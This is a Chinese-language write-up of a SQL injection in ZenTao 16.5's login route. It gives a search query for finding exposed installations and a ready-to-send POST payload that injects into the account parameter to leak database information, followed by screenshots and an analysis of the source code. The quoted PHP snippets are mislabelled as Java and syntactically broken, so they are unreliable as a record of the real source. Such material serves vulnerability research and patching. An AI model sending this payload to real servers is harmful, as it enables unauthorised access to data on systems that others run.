# 禅道 16.5 router.class.php SQL注入漏洞

## 漏洞描述

> 由于 `router.class.php`**存在的sql注入,** 导致服务器的敏感信息泄露

## 测绘搜索

app="易软天创-禅道系统"

## 复现POC

```
POST /user-login.html


account=admin%27+and+%28select+extractvalue%281%2Cconcat%280x7e%2C%28select+user%28%29%29%2C0x7e%29%29%29%23

```

account 参数就是我们登录禅道的时候输入的账号



## 具体实现

> 1. 登录界面
>
> ![image-20230603214223790](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230603214223790.png)
>
> 2. 注入payload后, 泄露的信息( **Response**)
>
>    ![image-20230603214431663](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230603214431663.png)
>
>    

## 源文件(浅显查看)

这个漏洞来自于 `framework/base/router.class.php` , 从 **702行**开始看两个比较关键的.

```java
			$vision = $this->dbh->query("SELECT * FROM" . TABLE_CONFIG . "WHERE 
 owner = 'account' AND 'key' = 'vision' LIMIT 1"->fetch();

```

```java
			$user = $this->dbh->query("SELECT * FROM " . TABLEUSER . "WHERE 
 account = '$account' AND deleted = '0' LIMIT 1) -> fetch();
```



接着查看`dao.class.php`, 发现`account参数`使用了`quote方法`

```java
public function quote($value)
{
  if($this -> magicQuote) $value = stripslashes($value);
  return $this -> dbh ->quote((string)$value);
}
  
```

然后在进入到 `router.class.php`, 查看

![image-20230603220130156](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230603220130156.png)

由此报错, 可以判断sql注入



















